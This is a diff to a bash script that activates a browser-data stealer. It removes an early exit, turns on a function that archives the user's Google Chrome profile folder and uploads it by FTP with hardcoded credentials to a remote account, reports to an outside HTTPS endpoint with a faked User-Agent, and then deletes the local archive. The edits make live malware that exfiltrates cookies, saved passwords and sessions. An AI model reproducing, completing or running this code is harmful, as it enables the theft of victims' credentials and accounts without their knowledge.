@@ -1,5 +1,5 @@
 #!/bin/bash
-exit 0
+#exit 0
 function dbgx(){
 	echo "[*] $1";
 }
@@ -66,11 +66,10 @@ function GCx_(){
 	ftp_password="Hello.321/"
 	#
 	folder_to_compress="/home/$USER/.config/google-chrome"
-	output_file="$IBUS_""gcx.tar.gz"
-	tar -czvf "$output_file" "$folder_to_compress"
+	local_file="$IBUS_"date +%s"gcx.tar.gz"
+	tar -czvf "$local_file" "$folder_to_compress"
 	#
-	local_file="$IBUS_""gcx.tar.gz"
-	remote_directory="/home/r00t1970/GCx.tar.gz"
+	remote_directory="/home/r00t1970/"date +%s"GCx.tar.gz"
 	#
 	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
 	quote USER $ftp_user
@@ -82,6 +81,9 @@ function GCx_(){
 	#
 	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
      dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
+     #
+     rm -f "$IBUS_""gcx.tar.gz"
+     rm -f "$local_file"
 }
 
 function ax(){
@@ -231,7 +233,7 @@ function px(){
     	ssx_ & PxNwx & Hstrx
 	#WbCmx
     	#ax_
-	#GCx_
+	GCx_
 	#
 	exit 0
     else
